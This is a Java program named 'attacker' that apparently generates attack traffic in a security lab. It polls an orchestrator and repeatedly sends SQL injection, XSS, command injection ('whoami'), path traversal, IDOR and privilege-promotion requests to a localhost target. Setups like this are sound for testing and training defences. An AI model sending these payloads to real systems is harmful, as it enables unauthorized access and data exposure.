import java.io.OutputStream;
import java.net.URI;
import java.net.HttpURLConnection;
import java.net.URL;

public class attacker {
    private static String orch = System.getenv().getOrDefault("ORCH", System.getenv().getOrDefault("ORCHESTRATOR_URL", "http://orchestrator:9000"));
    private static String target = System.getenv().getOrDefault("MY_TARGET", "http://localhost:9100");

    private static String getActiveService() {
        try {
            URL url = URI.create(orch + "/current").toURL();
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            try (java.io.InputStream in = conn.getInputStream()) {
                String response = new String(in.readAllBytes());
                return response.contains("\"active_service\":\"api\"") ? "api"
                        : response.contains("\"active_service\":\"file\"") ? "file"
                        : response.contains("\"active_service\":\"db\"") ? "db" : "web";
            }
        } catch (Exception e) {
            return "web";
        }
    }

    private static int postJson(String path, String body) throws Exception {
        URL url = URI.create(target + path).toURL();
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        try (OutputStream os = conn.getOutputStream()) {
            os.write(body.getBytes());
        }
        return conn.getResponseCode();
    }

    private static int get(String path) throws Exception {
        URL url = URI.create(target + path).toURL();
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        return conn.getResponseCode();
    }

    public static void main(String[] args) throws Exception {
        System.out.println("[attacker.java] started");
        while (true) {
            String service = getActiveService();

            try {
                int code;
                switch (service) {
                    case "web":
                        code = postJson("/web/login", "{\"username\":\"admin' OR '1'='1\",\"password\":\"x\"}");
                        System.out.println("attack web/login -> " + code);
                        code = get("/web/search?q=%27%20OR%20%271%27%3D%271");
                        System.out.println("attack web/search -> " + code);
                        code = postJson("/web/comment", "{\"comment\":\"<script>alert(1)</script>\"}");
                        System.out.println("attack web/comment -> " + code);
                        break;
                    case "api":
                        code = get("/api/admin");
                        System.out.println("attack api/admin -> " + code);
                        code = get("/api/users/2");
                        System.out.println("attack api/users -> " + code);
                        code = postJson("/api/run", "{\"cmd\":\"whoami\"}");
                        System.out.println("attack api/run -> " + code);
                        break;
                    case "file":
                        code = get("/file/download?file=../files/sample.txt");
                        System.out.println("attack file/download -> " + code);
                        break;
                    case "db":
                        code = postJson("/db/query", "{\"search\":\"' OR '1'='1\"}");
                        System.out.println("attack db/query -> " + code);
                        code = postJson("/db/user/2/promote", "{\"requester_id\":1}");
                        System.out.println("attack db/promote -> " + code);
                        break;
                    default:
                        System.out.println("attack unknown service: " + service);
                }
            } catch (Exception e) {
                System.out.println("attack error: " + e.getMessage());
            }

            Thread.sleep(3000);
        }
    }
}
